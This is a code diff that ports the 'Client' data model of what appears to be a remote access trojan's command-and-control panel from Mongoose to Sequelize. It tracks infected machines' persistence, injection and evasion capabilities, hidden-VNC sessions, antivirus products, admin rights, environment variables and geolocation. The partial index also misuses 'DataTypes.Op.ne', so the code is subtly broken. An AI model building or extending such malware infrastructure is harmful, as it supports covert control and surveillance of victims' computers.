@@ -1,247 +1,158 @@
-const mongoose = require('mongoose');
+const { DataTypes } = require('sequelize');
+const { sequelize } = require('../config/database');
 
-const clientSchema = new mongoose.Schema({
+const Client = sequelize.define('Client', {
+    id: {
+        type: DataTypes.UUID,
+        defaultValue: DataTypes.UUIDV4,
+        primaryKey: true
+    },
     uuid: {
-        type: String,
-        required: true,
-        unique: true,
+        type: DataTypes.STRING,
+        allowNull: false,
+        unique: true
     },
     computerName: {
-        type: String,
-        required: true,
+        type: DataTypes.STRING,
+        allowNull: false
     },
     ipAddress: {
-        type: String,
-        required: true,
+        type: DataTypes.STRING,
+        allowNull: false
     },
     country: {
-        type: String,
-        default: 'Unknown',
+        type: DataTypes.STRING,
+        defaultValue: 'Unknown'
     },
-    // Enhanced geolocation information
     geoLocation: {
-        country: String,
-        countryCode: String,
-        region: String,
-        regionName: String,
-        city: String,
-        zip: String,
-        latitude: Number,
-        longitude: Number,
-        timezone: String,
-        isp: String,
-        organization: String,
-        asn: String,
-        isPrivate: Boolean,
-        lastUpdated: {
-            type: Date,
-            default: Date.now
-        }
+        type: DataTypes.JSONB,
+        defaultValue: {}
     },
     hostname: {
-        type: String,
+        type: DataTypes.STRING
     },
     platform: {
-        type: String,
+        type: DataTypes.STRING
     },
-    // Enhanced platform-specific fields
     operatingSystem: {
-        type: String,
-        enum: ['windows', 'linux', 'macos', 'android', 'ios', 'unknown'],
-        default: 'unknown',
+        type: DataTypes.ENUM('windows', 'linux', 'macos', 'android', 'ios', 'unknown'),
+        defaultValue: 'unknown'
     },
     osVersion: {
-        type: String,
-        default: 'Unknown',
+        type: DataTypes.STRING,
+        defaultValue: 'Unknown'
     },
     architecture: {
-        type: String,
-        enum: ['x86', 'x64', 'arm', 'arm64', 'unknown'],
-        default: 'unknown',
+        type: DataTypes.ENUM('x86', 'x64', 'arm', 'arm64', 'unknown'),
+        defaultValue: 'unknown'
     },
-    // Agent capabilities
     capabilities: {
-        persistence: {
-            type: [String],
-            default: [],
-        },
-        injection: {
-            type: [String],
-            default: [],
-        },
-        evasion: {
-            type: [String],
-            default: [],
-        },
-        commands: {
-            type: [String],
-            default: [],
-        },
-        features: {
-            type: [String],
-            default: [],
-        },
-    },
-    // HVNC session metadata
-    hvncSession: {
-        sessionId: {
-            type: String
-        },
-        status: {
-            type: String,
-            enum: ['starting', 'active', 'stopping', 'stopped', 'error'],
-            default: 'starting'
-        },
-        quality: {
-            type: String,
-            enum: ['low', 'medium', 'high'],
-            default: 'medium'
-        },
-        fps: {
-            type: Number,
-            min: 1,
-            max: 60,
-            default: 15
-        },
-        settings: {
-            type: Object,
-            default: {}
-        },
-        screenInfo: {
-            width: Number,
-            height: Number,
-            colorDepth: Number,
-            dpi: Number
-        },
-        startedAt: Date,
-        endedAt: Date,
-        lastUpdate: Date,
-        error: String
-    },
-    // Authentication and security
-    authToken: {
-        type: String,
-        default: '',
-    },
-    lastHeartbeat: {
-        type: Date,
-        default: Date.now,
-    },
-    connectionCount: {
-        type: Number,
-        default: 0,
-    },
-    // System information
-    systemInfo: {
-        username: String,
-        domain: String,
-        isAdmin: Boolean,
-        antivirus: [String],
-        processes: Number,
-        uptime: Number,
-        memory: {
-            total: Number,
-            available: Number,
-        },
-        disk: {
-            total: Number,
-            free: Number,
-        },
-        // Enhanced system timing and details
-        bootTime: Date,
-        localTime: Date,
-        timeZone: String,
-        systemLocale: String,
-        cpuInfo: {
-            model: String,
-            cores: Number,
-            speed: Number
-        },
-        networkInterfaces: [{
-            name: String,
-            ip: String,
-            mac: String,
-            type: String
-        }],
-        installedSoftware: [String],
-        runningServices: [String],
-        environmentVariables: Object,
-        systemMetrics: {
-            cpuUsage: Number,
-            memoryUsage: Number,
-            diskUsage: Number,
-            networkActivity: {
-                bytesReceived: Number,
-                bytesSent: Number
-            }
+        type: DataTypes.JSONB,
+        defaultValue: {
+            persistence: [],
+            injection: [],
+            evasion: [],
+            commands: [],
+            features: []
         }
     },
+    hvncSession: {
+        type: DataTypes.JSONB,
+        defaultValue: null
+    },
+    authToken: {
+        type: DataTypes.STRING,
+        defaultValue: ''
+    },
+    lastHeartbeat: {
+        type: DataTypes.DATE,
+        defaultValue: DataTypes.NOW
+    },
+    connectionCount: {
+        type: DataTypes.INTEGER,
+        defaultValue: 0
+    },
+    systemInfo: {
+        type: DataTypes.JSONB,
+        defaultValue: {}
+    },
     lastActiveTime: {
-        type: Date,
-        default: Date.now,
+        type: DataTypes.DATE,
+        defaultValue: DataTypes.NOW
     },
     additionalSystemDetails: {
-        type: String,
-        default: '',
+        type: DataTypes.TEXT,
+        defaultValue: ''
     },
     status: {
-        type: String,
-        enum: ['online', 'offline'],
-        default: 'offline',
+        type: DataTypes.ENUM('online', 'offline'),
+        defaultValue: 'offline'
     },
-    // Client identity and deduplication
     machineFingerprint: {
-        type: String,
+        type: DataTypes.STRING,
         unique: true,
-        sparse: true, // Allow null values for existing records
+        allowNull: true
     },
     firstSeen: {
-        type: Date,
-        default: Date.now,
+        type: DataTypes.DATE,
+        defaultValue: DataTypes.NOW
     },
     connectedAt: {
-        type: Date,
+        type: DataTypes.DATE
     },
     disconnectedAt: {
-        type: Date,
+        type: DataTypes.DATE
     },
     uptimeSeconds: {
-        type: Number,
-        default: 0,
+        type: DataTypes.INTEGER,
+        defaultValue: 0
     },
     bootTime: {
-        type: Date,
+        type: DataTypes.DATE
     },
-    // Command metrics
     commandSuccess: {
-        type: Number,
-        default: 0,
+        type: DataTypes.INTEGER,
+        defaultValue: 0
     },
     commandFailed: {
-        type: Number,
-        default: 0,
+        type: DataTypes.INTEGER,
+        defaultValue: 0
     },
     avgLatencyMs: {
-        type: Number,
-        default: 0,
+        type: DataTypes.FLOAT,
+        defaultValue: 0
     },
-    // Keep legacy fields for backward compatibility
+    // Legacy fields for backward compatibility
     ip: {
-        type: String,
+        type: DataTypes.STRING
     },
     lastSeen: {
-        type: Date,
-    },
+        type: DataTypes.DATE
+    }
 }, {
+    tableName: 'clients',
     timestamps: true,
+    indexes: [
+        {
+            unique: true,
+            fields: ['uuid']
+        },
+        {
+            unique: true,
+            fields: ['machineFingerprint'],
+            where: {
+                machineFingerprint: {
+                    [DataTypes.Op.ne]: null
+                }
+            }
+        },
+        {
+            fields: ['status', 'lastHeartbeat']
+        },
+        {
+            fields: ['machineFingerprint', 'uuid']
+        }
+    ]
 });
-
-// Add indexes for performance and uniqueness
-clientSchema.index({ uuid: 1 }, { unique: true });
-clientSchema.index({ machineFingerprint: 1 }, { unique: true, sparse: true });
-clientSchema.index({ status: 1, lastHeartbeat: -1 });
-clientSchema.index({ machineFingerprint: 1, uuid: 1 });
-
-const Client = mongoose.model('Client', clientSchema);
 
 module.exports = Client;
